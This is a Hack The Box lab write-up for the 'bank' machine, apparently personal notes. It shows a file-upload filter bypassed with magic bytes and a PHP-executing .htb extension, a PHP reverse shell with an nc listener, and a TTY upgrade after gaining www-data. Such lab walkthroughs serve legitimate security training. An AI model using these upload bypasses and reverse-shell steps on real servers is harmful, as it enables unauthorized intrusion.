Will test and see if there is a upload vulnerability exists or not.
┌──(root㉿kali)-[~/htb/bank]
└─# cp /usr/share/laudanum/php/php-reverse-shell.php .     

will change the ip and port 

And will also set a net-cat listener
┌──(root㉿kali)-[~]
└─# nc -lnvp 4444                    
listening on [any] 4444 ...

![[Pasted image 20230819105239.png]]

As you can see we got a error as we can only upload the image files
![[Pasted image 20230819105604.png]]

Even the Magic Bytes didn't worked and got the same error as above.
Yes the Magic Bytes worked when the .php is removed as .img is kept as it is
http://bank.htb/uploads/logo.png?cmd=whoami
When we go the site we were not able to run the query as it's a image
![[Pasted image 20230819111147.png]]

When we enumerate the reponse we were able to see that .htb extension will execute as php
Voilla we got want we want ^__^ 
![[Pasted image 20230819111359.png]]

We have upload the above file with .htb extension
![[Pasted image 20230819111627.png]]

![[Pasted image 20230819111714.png]]
We got the www-data at the end.

Let's run some command and see if we have nc on the box or not
We got the path /bin/nc when we run the command which nc
![[Pasted image 20230819111814.png]]

As the tab got hung up that's the indication that we got the shell 
![[Pasted image 20230819112023.png]]

Will run the python pty to get the full control from the dumb shell
python -c 'import pty;pty.spawn("/bin/bash")'

ctrl+z 

stty raw -echo;fg

reset

──(root㉿kali)-[~/htb/bank]
└─# echo $TERM
xterm-256color


Will get something like this 
![[Pasted image 20230819113222.png]]
simply set TERM environment variable not set
now we can use ctrl + l to clear and it will work as charm.

SO NOW WE HAVE FULL SHELL POWER WITH SHELL AUTO-COMPLETE WITH WE HIT THE TAB AND IT MAKES LIFE EASY.

